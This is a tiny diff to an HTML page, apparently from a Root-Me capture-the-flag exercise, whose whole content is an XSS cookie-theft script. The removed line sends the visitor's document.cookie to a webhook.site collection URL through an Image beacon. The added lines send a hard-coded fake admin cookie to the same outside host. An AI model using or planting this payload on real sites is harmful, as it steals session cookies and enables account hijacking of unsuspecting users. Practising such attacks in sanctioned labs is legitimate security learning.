@@ -7,7 +7,8 @@
 <body>
 <script>
 var id = "ROOTME-" + Date.now();
-new Image().src="https://webhook.site/ce778b6b-c321-40ef-bb8e-eeee883a2e0a" + encodeURIComponent(document.cookie);
+var fakeCookie = "cookie_admin=123456";
+new Image().src="https://webhook.site/ce778b6b-c321-40ef-bb8e-eeee883a2e0a?id="+encodeURIComponent(fakeCookie);
 </script>
 </body>
 </html>
